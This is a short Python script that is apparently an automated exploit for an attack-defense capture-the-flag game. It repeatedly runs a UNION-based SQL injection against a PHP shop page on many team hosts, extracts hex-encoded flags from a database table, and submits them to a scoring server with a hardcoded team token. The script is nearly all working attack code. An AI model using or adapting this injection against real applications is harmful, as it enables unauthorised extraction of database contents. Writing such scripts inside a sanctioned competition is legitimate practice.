import requests


def decode_flag(input):
    return bytes.fromhex(input).decode('utf-8')

while 1:
    for i in range(1,21):
        if i == 6: continue
        try:
            team_id = str(i).rjust(2, '0')
            url = f'http://10.254.0.254:4{team_id}1'
            print(url)

            r = requests.get(url + '/index.php?page=shop&type=%27+union+select+group_concat(hex(flag)),2,3,4,5,6+from+flags--')
            flags = r.text.split(',')[-1].split('"')[0]

            flags = decode_flag(flags)
            #print(flags)
            #exit()
            #flags = res['content'].split('\n')[-2]
            arr = [flags]
            print(arr)
            TIMEOUT = 5

            #submit flag to server
            r = requests.put('http://10.254.0.253:8080/flags',
                                headers={'X-Team-Token': 'ffbc6c754fb95409', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'Connection: close', 'Content-Length': '36', },
                                json=[flag for flag in arr], timeout=TIMEOUT)

            print(r.text)
            #time.sleep(5)
        except:
            pass
    print('finis 1 round')
    #time.sleep(300)